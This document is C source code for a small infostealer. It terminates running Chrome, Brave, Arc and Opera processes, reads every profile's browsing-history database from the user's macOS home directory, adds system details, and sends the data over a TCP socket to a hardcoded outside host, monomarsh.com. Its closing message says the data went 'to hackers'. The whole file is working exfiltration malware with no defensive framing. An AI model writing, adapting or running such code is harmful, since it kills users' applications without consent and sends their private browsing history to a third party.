#include <dirent.h>
#include <libgen.h>
#include <netdb.h>
#include <pwd.h>
#include <signal.h>
#include <sqlite3.h>
#include <sys/utsname.h>
#include <sys/wait.h>

#include "network.h"

typedef struct {
    char *buf;
    size_t len;
} buffer_t;

size_t handle_arguments(int argc, char **argv, char **hostname) {
    int option;
    size_t port = 0;

    while ((option = getopt(argc, argv, "p:h:")) != -1) {
        switch (option) {
            case 'p':
                port = atoi(optarg);
                break;
            case 'h':
                *hostname = optarg;
                break;
            case '?':
                fprintf(stderr, "invalid option: %c.\n", optopt);
                exit(1);
            default:
                fprintf(stderr, "unknown option: %c.\n", option);
                exit(1);
        }
    }

    for (int index = optind; index < argc; index++) {
        printf("unknown option: %s\n", argv[index]);
    }
    if (optind < argc) exit(1);

    if (port == 0) port = 6969;
    return port;
}

static int callback(void *buf, int argc, char **argv, char **column_names) {
    buffer_t *buffer = (buffer_t *)buf;

    buffer->len += strlen(argv[1]) + strlen(argv[0]) + 2;
    buffer->buf = realloc(buffer->buf, buffer->len);
    if (buffer->buf == NULL) panic("failed to allocate memory");

    if (argc > 1) {
        strcat(buffer->buf, argv[1]);
        strcat(buffer->buf, ",");
        strcat(buffer->buf, argv[0]);
        strcat(buffer->buf, "\n");
    }

    return 0;
}

#if defined(__linux__)
void killall(size_t argc, const char **argv) {
    DIR *dir = opendir("/proc");
    if (!dir) panic("failed to open /proc");

    struct dirent *entry;
    while ((entry = readdir(dir))) {
        if (entry->d_type != DT_DIR) continue;

        char path[PATH_MAX];
        snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);

        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char cmd[128];
        fgets(cmd, sizeof(cmd), fp);

        fclose(fp);

        char *full = strtok(cmd, " ");
        if (!full) break;
        char *name = basename(full);
        if (!name) panic("failed to get basename");

        pid_t pid;
        for (size_t i = 0; i < argc; i++) {
            if (strcmp(name, argv[i]) != 0) continue;

            pid = atoi(entry->d_name);
            if (pid < 1) continue;

            if (kill(pid, SIGTERM) == 0) {
                int status;
                waitpid(pid, &status, 0);
                printf("%s: %d\n", name, pid);
                break;
            } else {
                fprintf(stderr, "failed to kill pid %d: %s\n", pid,
                        strerror(errno));
            }
        }
    }

    closedir(dir);
}

#elif defined(__APPLE__)
#include <libproc.h>
void killall(size_t argc, const char **argv) {
    size_t counter = 0;
    pid_t pids[2048];
    int bytes = proc_listpids(PROC_ALL_PIDS, 0, pids, sizeof(pids));
    int n_proc = bytes / sizeof(pids[0]);

    for (size_t i = 0; i < n_proc; i++) {
        struct proc_bsdinfo proc;
        if (proc_pidinfo(pids[i], PROC_PIDTBSDINFO, 0, &proc,
                         PROC_PIDTBSDINFO_SIZE) != PROC_PIDTBSDINFO_SIZE)
            continue;

        for (size_t j = 0; j < argc; j++) {
            if (strcmp(argv[j], proc.pbi_name) != 0) continue;
            kill(pids[i], SIGTERM);
            counter++;
        }
    }

    if (counter != 0) killall(argc, argv);
}

#else
#error unsupported platform
#endif

void read_history(char *path, buffer_t *buf) {
    buf->len += strlen(path) + 2;
    buf->buf = realloc(buf->buf, buf->len);
    if (buf->buf == NULL) panic("failed to allocate memory");
    strcat(buf->buf, "\n");
    strcat(buf->buf, path);
    strcat(buf->buf, "\n");

    sqlite3 *database;
    char *error_message = 0;
    char *command =
        "SELECT url, last_visit_time FROM urls WHERE "
        "last_visit_time IS NOT NULL ORDER BY "
        "last_visit_time DESC";

    if (sqlite3_open(path, &database)) {
        fprintf(stderr, "failed to open history database: %s.\n",
                sqlite3_errmsg(database));
        sqlite3_close(database);
        exit(1);
    }

    if (sqlite3_exec(database, command, callback, buf, &error_message)) {
        fprintf(stderr, "SQL error: %s.\n", error_message);
        sqlite3_free(error_message);
        sqlite3_close(database);
        exit(1);
    }

    sqlite3_close(database);
}

void extract_history(buffer_t *buf) {
    const char *dirs[] = {"Google/Chrome", "BraveSoftware/Brave-Browser",
                          "com.operasoftware.Opera",
                          "com.operasoftware.OperaGX", "Arc/User Data"};

    char *home_directory;
    struct passwd *pwd = getpwuid(getuid());
    if (pwd) {
        home_directory = pwd->pw_dir;
    } else {
        home_directory = getenv("HOME");
        if (!home_directory) panic("failed to get home directory");
    }

    const char *process_names[] = {"Google Chrome", "Brave Browser", "Arc",
                                   "Opera"};
    killall(4, process_names);

    char path[PATH_MAX];
    for (size_t i = 0; i < 5; i++) {
        sprintf(path, "%s/Library/Application Support/%s", home_directory,
                dirs[i]);

        DIR *dp = opendir(path);
        if (!dp) continue;

        struct dirent *dptr;
        while ((dptr = readdir(dp)) != NULL) {
            if (dptr->d_type != DT_DIR) continue;
            sprintf(path, "%s/Library/Application Support/%s/%s/History",
                    home_directory, dirs[i], dptr->d_name);

            if (access(path, R_OK) == 0) read_history(path, buf);
        }

        closedir(dp);
    }
}

void extract_uname(buffer_t *buf) {
    struct utsname uname_data;
    if (uname(&uname_data) == -1) panic("failed to get system data");

    buf->len += strlen(uname_data.sysname) + strlen(uname_data.machine) + 3;
    buf->buf = realloc(buf->buf, buf->len);
    if (buf->buf == NULL) panic("failed to allocate memory");

    strcat(buf->buf, ",");
    strcat(buf->buf, uname_data.sysname);
    strcat(buf->buf, "-");
    strcat(buf->buf, uname_data.machine);
    strcat(buf->buf, "\n");
}

void extract_my_data(int fd) {
    buffer_t buffer = {NULL, 0};
    buffer.buf = calloc(1, sizeof(char));
    strcat(buffer.buf, "\0");
    buffer.len = 1;

    extract_uname(&buffer);
    extract_history(&buffer);

    buffer.len += 2;
    buffer.buf = realloc(buffer.buf, buffer.len);
    if (buffer.buf == NULL) panic("failed to allocate memory");
    strcat(buffer.buf, "\r\n");

    send(fd, buffer.buf, buffer.len, 0);
    free(buffer.buf);
}

int main(int argc, char **argv) {
    char *hostname = "monomarsh.com";
    size_t port = handle_arguments(argc, argv, &hostname);

    struct hostent *host = gethostbyname(hostname);
    if (host == NULL) panic("failed to resolve host");

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) panic("failed to open socket");

    struct sockaddr_in server;
    server.sin_addr = *((struct in_addr *)host->h_addr);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0)
        panic("failed to connect to server");

    extract_my_data(sockfd);

    printf("sent system information and chrome history to hackers. goodbye!\n");
    close(sockfd);
    return 0;
}
